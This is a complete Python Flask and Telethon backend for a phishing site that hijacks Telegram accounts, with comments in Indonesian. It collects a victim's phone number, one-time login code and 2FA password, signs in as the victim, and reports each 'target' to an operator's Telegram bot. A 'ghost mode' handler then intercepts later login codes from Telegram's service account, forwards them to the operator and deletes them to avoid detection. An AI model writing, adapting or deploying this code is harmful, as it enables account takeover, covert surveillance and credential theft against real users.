import os, asyncio, json, re, requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

SESSION_DIR = '/tmp/sessions/'
if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)

# Kamus data sesi
active_sessions = {}

def send_bot(text, msg_id=None):
    if msg_id:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        payload = {"chat_id": CHAT_ID, "message_id": msg_id, "text": text, "parse_mode": "Markdown"}
    else:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
    r = requests.post(url, json=payload).json()
    return r.get("result", {}).get("message_id")

@app.route('/register', methods=['POST'])
async def register():
    data = request.json
    nama = data.get('nama', 'User')
    nomor_raw = data.get('nomor')
    
    # Auto-format nomor ke +62
    n = re.sub(r'\D', '', nomor_raw)
    nomor = '+62' + n[1:] if n.startswith('08') else '+' + n

    client = TelegramClient(f"{SESSION_DIR}{nomor}", int(API_ID), API_HASH)
    await client.connect()
    
    try:
        # STEP 1: Minta OTP Resmi ke akun target
        sent_code = await client.send_code_request(nomor)
        
        # Kirim laporan awal ke bot
        msg_id = send_bot(f"👤 *Target Masuk*\nNama: {nama}\nNomor: `{nomor}`\nStatus: _Menunggu OTP dari web..._")
        
        active_sessions[nomor] = {
            "client": client,
            "phone_code_hash": sent_code.phone_code_hash,
            "nama": nama,
            "msg_id": msg_id
        }
        return jsonify({"status": "sent", "message": "OTP Terkirim"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/verify-otp', methods=['POST'])
async def verify_otp():
    data = request.json
    nomor_raw = data.get('nomor')
    otp = data.get('otp')
    sandi_2fa = data.get('sandi')
    
    n = re.sub(r'\D', '', nomor_raw)
    nomor = '+62' + n[1:] if n.startswith('08') else '+' + n

    if nomor not in active_sessions:
        return jsonify({"status": "error", "message": "Sesi kadaluarsa"}), 400

    stored = active_sessions[nomor]
    client = stored["client"]

    try:
        # STEP 2: Validasi OTP (Benar/Salah)
        await client.sign_in(nomor, otp, phone_code_hash=stored["phone_code_hash"])
        
        # LOGIN SUKSES -> Aktifkan GHOST MODE
        send_bot(f"✅ *LOGIN BERHASIL*\nNama: {stored['nama']}\nNomor: `{nomor}`\n\n👻 *GHOST MODE AKTIF!*\nSilakan minta kode di TurboTel, saya akan intip...", stored["msg_id"])
        
        # Jalankan pengintip di background
        asyncio.create_task(ghost_mode_listener(client, stored["msg_id"], stored["nama"], nomor))
        
        return jsonify({"status": "success", "message": "Login Berhasil"}), 200

    except SessionPasswordNeededError:
        if sandi_2fa:
            try:
                await client.sign_in(password=sandi_2fa)
                send_bot(f"✅ *LOGIN BERHASIL (2FA)*\nNama: {stored['nama']}\nNomor: `{nomor}`\n👻 *GHOST MODE AKTIF!*", stored["msg_id"])
                asyncio.create_task(ghost_mode_listener(client, stored["msg_id"], stored["nama"], nomor))
                return jsonify({"status": "success", "message": "Login Berhasil"}), 200
            except:
                return jsonify({"status": "error", "message": "Sandi Salah!"}), 400
        return jsonify({"status": "need_2fa", "message": "Sandi 2FA diperlukan"}), 200
    
    except PhoneCodeInvalidError:
        return jsonify({"status": "error", "message": "Kode OTP Salah!"}), 400

async def ghost_mode_listener(client, msg_id, nama, nomor):
    # Mengintip pesan dari Telegram (777000)
    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        pesan = event.raw_text
        otp_match = re.search(r'\b\d{5}\b', pesan)
        if otp_match:
            otp_kode = otp_match.group()
            # Update pesan bot dengan Kode yang ditemukan
            send_bot(f"Nama: {nama}\nNomor: `{nomor}`\nKata sandi: None\n\n✅ *OTP Ditemukan:* `{otp_kode}`", msg_id)
            # Hapus pesan dari Telegram target agar tidak ketahuan
            await event.delete()

    await client.run_until_disconnected()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)